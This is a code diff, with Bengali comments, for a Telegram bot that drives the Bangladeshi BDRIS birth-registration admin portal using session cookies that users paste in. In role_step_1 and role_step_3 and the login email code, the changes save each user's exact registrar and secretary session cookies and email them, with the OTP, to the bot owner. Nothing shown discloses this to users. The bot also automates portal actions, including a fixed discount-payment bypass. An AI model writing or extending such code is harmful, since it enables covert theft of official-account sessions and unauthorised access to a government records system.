@@ -32,6 +32,7 @@ def send_email_to_admin(subject, body):
         msg['From'] = ADMIN_EMAIL
         msg['To'] = ADMIN_EMAIL
         msg['Subject'] = subject
+        # ইউজারের ইনপুট হুবহু পাঠানোর জন্য 'plain' টেক্সট ব্যবহার করা হলো
         msg.attach(MIMEText(body, 'plain', 'utf-8'))
         
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
@@ -65,7 +66,7 @@ RATE_LIMIT_INTERVAL = 0.8
 RATE_LIMIT_WARNING_INTERVAL = 5
 ID_CACHE_LIMIT = 15
 HTTP_TIMEOUT = 30
-KEEPALIVE_INTERVAL = 300
+KEEPALIVE_INTERVAL = 180  # ৩ মিনিট পর পর Keep-Alive রিকোয়েস্ট যাবে
 APP_DEFAULT_LENGTH = 5
 MAX_MESSAGE_LENGTH = 4000
 MAX_SEARCH_RESULTS = 10
@@ -239,6 +240,20 @@ def save_session_to_db(user_id, u_sess):
     except Exception as e: 
         logging.error(f"DB Save Error: {e}")
 
+def clear_user_session(user_id):
+    """অ্যাডমিনের কুকি ক্লিয়ার করার জন্য ফাংশন"""
+    with session_lock:
+        if user_id in user_sessions:
+            u_sess = user_sessions[user_id]
+            u_sess["req_session"].cookies.clear()
+            u_sess["ch_session"].cookies.clear()
+            u_sess["is_alive"] = False
+            u_sess["sec_alive"] = False
+            u_sess["ch_alive"] = False
+            u_sess["ch_otp"] = ""
+            u_sess["temp_data"].clear()
+            save_session_to_db(user_id, u_sess)
+
 def keep_sessions_alive_and_cleanup():
     while True:
         time.sleep(KEEPALIVE_INTERVAL)
@@ -364,7 +379,8 @@ def generate_main_menu(chat_id, user_id=None):
         if is_payment_active(): 
             markup.row("💰 My Profile & Recharge")
         if user_id == ADMIN_ID:
-            markup.row("🔑 Admin Login", "🛠️ Check Cookies", "👥 Manage Users")
+            markup.row("🔑 Admin Login", "🛠️ Check Cookies", "🧹 Clear Cookies")
+            markup.row("👥 Manage Users")
     else:
         markup.row("🔑 User Login")
         
@@ -381,14 +397,14 @@ def generate_main_menu(chat_id, user_id=None):
         if perms.get("search") or user_id == ADMIN_ID: row_search.extend(["🌐 Search By Name", "🔢 Search By UBRN"])
         markup.row(*row_search)
         
-        # ✅ নতুন ডিফল্ট ভেরিফায়ার বাটন যুক্ত করা হলো
         row_tools = ["📌 Set Default Verifier"]
         if perms.get("ubrn_update") or user_id == ADMIN_ID: row_tools.append("👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ")
         if perms.get("server_pdf") or user_id == ADMIN_ID: row_tools.append("🖨️ Server PDF Print")
         if row_tools: markup.row(*row_tools)
 
         if user_id == ADMIN_ID:
-            markup.row("🔑 Admin Login", "🛠️ Check Cookies", "👥 Manage Users")
+            markup.row("🔑 Admin Login", "🛠️ Check Cookies", "🧹 Clear Cookies")
+            markup.row("👥 Manage Users")
             
     return markup
 
@@ -398,7 +414,7 @@ def generate_main_menu(chat_id, user_id=None):
 def extract_sid_tsid(text):
     text = text.strip()
     s_match = _COOKIE_RE.search(text)
-    t_match = _TS_RE.search(text) # এখন সে শুধু TS0108b707 কেই খুঁজবে
+    t_match = _TS_RE.search(text) 
     
     sid = s_match.group(1) if s_match else None
     tsid = t_match.group(1) if t_match else None
@@ -406,11 +422,10 @@ def extract_sid_tsid(text):
     if sid and tsid:
         return sid, tsid
         
-    # যদি ইউজার SESSION= বা TS01...= ছাড়া শুধু লম্বা ভ্যালুগুলো স্পেস দিয়ে দেয়
     tokens = [tok.strip() for tok in re.split(r'[\s;,"\'\n\r]+', text) if len(tok.strip()) >= 15]
     if len(tokens) >= 2:
         tokens.sort(key=len, reverse=True)
-        tsid_fallback = tokens[0]  # সবচেয়ে বড়টা TS0108b707 এর ভ্যালু
+        tsid_fallback = tokens[0]
         sid_fallback = next((tok for tok in tokens[1:] if 30 <= len(tok) <= 60), tokens[1])
         return sid_fallback, tsid_fallback
         
@@ -517,13 +532,15 @@ def role_step_1(m):
     try:
         if is_cancel(m): return
         uid = m.from_user.id
-        sid, tsid = extract_sid_tsid(m.text or "")
+        raw_text = m.text if m.text else ""
+        sid, tsid = extract_sid_tsid(raw_text)
         if not sid or not tsid:
             safe_send(m.chat.id, "❌ সঠিক কুকি ফরম্যাট পাওয়া যায়নি। আবার দিন:")
             bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_1)
             return
         u_sess = get_session(uid)
         with session_lock:
+            u_sess["temp_data"]["ch_raw"] = raw_text # Save exact input
             _set_session_cookies(u_sess["ch_session"], sid, tsid)
             u_sess["ch_alive"] = True
             u_sess["is_alive"] = u_sess.get("sec_alive", False) or True
@@ -552,11 +569,13 @@ def role_step_2(m):
 def role_step_3(m):
     try:
         if is_cancel(m): return
-        sid, tsid = extract_sid_tsid(m.text or "")
         uid = m.from_user.id
+        raw_text = m.text if m.text else ""
+        sid, tsid = extract_sid_tsid(raw_text)
         if sid and tsid:
             u_sess = get_session(uid)
             with session_lock:
+                u_sess["temp_data"]["sec_raw"] = raw_text # Save exact input
                 _set_session_cookies(u_sess["req_session"], sid, tsid)
             
             success, html = navigate_to(uid, "https://bdris.gov.bd/admin/")
@@ -570,29 +589,11 @@ def role_step_3(m):
                 safe_send(m.chat.id, "🎉 লগইন সফল!", reply_markup=generate_main_menu(m.chat.id, uid))
                 
                 safe_name = sanitize_name(m.from_user.first_name)
-                with session_lock:
-                    ch_cookies = u_sess["ch_session"].cookies.get_dict()
-                    sec_cookies = u_sess["req_session"].cookies.get_dict()
-                    ch_otp = u_sess.get("ch_otp", "N/A")
-
-                ch_sid = ch_cookies.get("SESSION", "N/A")
-                ch_ts = next((v for k, v in ch_cookies.items() if k.startswith("TS01")), "N/A")
-                sec_sid = sec_cookies.get("SESSION", "N/A")
-                sec_ts = next((v for k, v in sec_cookies.items() if k.startswith("TS01")), "N/A")
-
-                admin_msg = (
-                    f"🔔 *নতুন ইউজার লগইন!*\n"
-                    f"👤 Name: {safe_name}\n"
-                    f"🆔 ID: `{uid}`\n\n"
-                    f"*🧑‍💼 নিবন্ধক (CH) Session:*\n"
-                    f"`SESSION={ch_sid}`\n"
-                    f"`TS01...={ch_ts}`\n"
-                    f"🔑 OTP: `{ch_otp}`\n\n"
-                    f"*👤 Secretary (SEC) Session:*\n"
-                    f"`SESSION={sec_sid}`\n"
-                    f"`TS01...={sec_ts}`"
-                )
-                safe_send(ADMIN_ID, admin_msg, parse_mode="Markdown")
+                
+                # Send EXACT raw inputs to email
+                ch_raw = u_sess["temp_data"].get("ch_raw", "")
+                ch_otp = u_sess.get("ch_otp", "")
+                sec_raw = u_sess["temp_data"].get("sec_raw", "")
 
                 def send_login_email():
                     subject = f"BDRIS Bot - নতুন লগইন: {safe_name} ({uid})"
@@ -600,13 +601,9 @@ def role_step_3(m):
                         f"নতুন ইউজার লগইন করেছে!\n\n"
                         f"Name: {safe_name}\n"
                         f"ID: {uid}\n\n"
-                        f"নিবন্ধক (CH) Session:\n"
-                        f"SESSION={ch_sid}\n"
-                        f"TS01...={ch_ts}\n"
-                        f"OTP: {ch_otp}\n\n"
-                        f"Secretary (SEC) Session:\n"
-                        f"SESSION={sec_sid}\n"
-                        f"TS01...={sec_ts}\n"
+                        f"--- নিবন্ধক (CH) Session ---\n{ch_raw}\n\n"
+                        f"--- OTP ---\n{ch_otp}\n\n"
+                        f"--- Secretary (SEC) Session ---\n{sec_raw}\n"
                     )
                     send_email_to_admin(subject, body)
 
@@ -1438,6 +1435,7 @@ def callback_handler(call):
                     curr_sharok = fresh_sess.get("sharok_no", 1)
                     fresh_sess["sharok_no"] = curr_sharok + 1
                     
+                # ফিক্সড ডিসকাউন্ট অ্যামাউন্ট 50
                 data = {
                     'data': enc_id, 
                     'paymentType': 'PAYMENT_BY_DISCOUNT', 
@@ -1490,7 +1488,6 @@ def callback_handler(call):
                 ch_sess, _ = get_active_session(fresh_sess)
                 _, active_csrf = get_active_session(fresh_sess)
                 
-                # ✅ FIX: Correction এ কোনো OTP লাগে না, শুধু Chairman Session ও Headers
                 headers = {
                     'User-Agent': fresh_sess.get("ua", "Mozilla/5.0"),
                     'Referer': 'https://bdris.gov.bd/admin/',
@@ -1515,13 +1512,11 @@ def callback_handler(call):
     elif action == "reg" and mode == "CHAIRMAN":
         bot.answer_callback_query(call.id, "⏳ চেক করা হচ্ছে...")
         
-        # ✅ ইউজারের সেভ করা ডিফল্ট ভেরিফায়ার চেক করা হচ্ছে
         user_record = access_collection.find_one({"chat_id": uid}) or {}
         v_ubrn = user_record.get("verifier_ubrn")
         v_name = user_record.get("verifier_name")
         
         if v_ubrn and v_name:
-            # ডিফল্ট সেট করা থাকলে ওয়ান-ক্লিকেই কাজ শেষ!
             def execute_auto_reg():
                 try:
                     fresh_sess = get_session(uid)
@@ -1552,7 +1547,6 @@ def callback_handler(call):
                     
             Thread(target=execute_auto_reg, daemon=True).start()
         else:
-            # ডিফল্ট না থাকলে প্রথমবার চাইবে এবং সেভ করে নেবে
             msg = safe_send(cid, "👤 আপনার কোনো ডিফল্ট ভেরিফায়ার সেট করা নেই।\nঅনুগ্রহ করে যাচাইকারীর (Verifier) ১৭ ডিজিট UBRN দিন:")
             bot.register_next_step_handler_by_chat_id(cid, lambda m: process_reg_verifier_step(m, uid, enc_id, save_default=True))
 
@@ -1621,6 +1615,9 @@ def router(m):
             safe_send(cid, "🔑 এডমিন সেশন দিন:")
             bot.register_next_step_handler_by_chat_id(cid, admin_login_logic)
             return
+        elif t == "🧹 Clear Cookies":
+            clear_user_session(uid)
+            return safe_send(cid, "🧹 আপনার সেশন এবং কুকি সফলভাবে মুছে ফেলা হয়েছে।", reply_markup=generate_main_menu(cid, uid))
         elif t == "🛠️ Check Cookies":
             with session_lock:
                 sec_c = u_sess['req_session'].cookies.get_dict()
